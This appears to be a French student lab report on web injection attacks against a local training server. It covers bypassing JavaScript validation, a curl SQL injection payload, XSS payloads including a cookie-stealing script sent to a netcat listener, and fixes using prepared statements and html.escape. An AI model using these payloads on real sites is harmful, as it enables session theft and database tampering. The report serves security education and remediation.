# Rendu "Injection"

## Binome

AMIRAT, Nadia, email: nadia.amirat.etu@univ-lille.fr
AMARA, Cyria, email: cyria.amara.etu@univ-lille.fr


## Question 1

* Quel est ce mécanisme :

C'est la méthode javascript <b>validate()</b> qui permet de faire ce mécanisme, elle renvoie un pop lorsqu'on essaye d'insérer une chaine qui ne comporte pas uniquement des lettres et des chiffres.

* Est-il efficace? Pourquoi? 

Est-il efficace : Non.

Justification :
Il y a plusieurs façon de contourner ce problème, par exemple il suffit d'ouvrir la fenêtre inspecter l'element du navigateur et supprimer le contenu du champ : <code>onsubmit:"return validate()"</code> pour avoir <code>onsubmit:""</code>

## Question 2

* Commande Curl pour l'insertion :

<code>curl 'http://127.0.0.1:8080/' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8' -H 'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://127.0.0.1:8080/' -H 'Connection: keep-alive' -H 'Referer: http://127.0.0.1:8080/' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'chaine=test g;%3B+e&submit=OK'</code>

ou bien :

<code>curl -d 'chaine=je teste ;'  "http://localhost:8080";</code>



## Question 3

* Commande curl qui insére une chaine dans la base de données, tout en faisant en sorte que le champ who soit rempli avec ce qu'on veut :

<code>curl -d "chaine=toto','tata')#&submit=OK" http://localhost:8080;</code>


* Expliquez comment obtenir des informations sur une autre table :

La solution serait d'ajouter une requête qui permet d'exploiter la table juste après le point virgule de la requête precedente.

## Question 4

Rendre un fichier server_correct.py avec la correction de la faille de
sécurité.
Expliquez comment vous avez corrigé la faille :
Pour prévenir les injections SQL, il faut faire appel aux requêtes préparées.
Un prepared statement a été mit en place sur le <b>cursor</b> comme suit :
<code>cursor = self.conn.cursor(prepared=True)</code>.
Ensuite, une requête paramétrée a été mise en place et ce en passant la variable de l'entrée de l'utilisateur en tant qu'espace réservé comme suit :
<code>requete = "INSERT INTO chaines (txt) VALUES(%s,%s);"</code>
Il suffit ensuite de récuperer l'entrée de l'utilisateur pour enfin la passer à la requête :
<code>cursor.execute(requete,(post["chaine"],cherrypy.request.remote.ip))</code>


## Question 5

* Commande curl pour afficher une fenetre de dialog :

<code>curl 'http://127.0.0.1:8080/' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8' -H 'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://127.0.0.1:8080/' -H 'Connection: keep-alive' -H 'Referer: http://127.0.0.1:8080/' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'chaine=<script>alert("je suis la fenetre de Dialog")</script>&submit=OK'</code>


* Commande curl pour lire les cookies
    -lancer la commande netcat : on lance la commande nc -l -p 1234 (dans un nouveau terminal pour recevoir les données)
```
curl -d 'chaine=<script>window.location.replace("http://localhost:1234/search?cookie=" %2B document.cookie)</script>'  http://localhost:8080;
```
Rmq : -d pour remplacer : 'http://127.0.0.1:8080/' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8' -H 'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://127.0.0.1:8080/' -H 'Connection: keep-alive' -H 'Referer: http://127.0.0.1:8080/' -H 'Upgrade-Insecure-Requests: 1' --data-raw 

## Question 6

Rendre un fichier server_xss.py avec la correction de la
faille. Expliquez la demarche que vous avez suivi.

On supprime avec la fonction html.escape() tout  caractère qui pourrait être interprété comme du html.
changement du code :
<code>chaine_ip = (html.escape(post["chaine"]), cherrypy.request.remote.ip)</code>

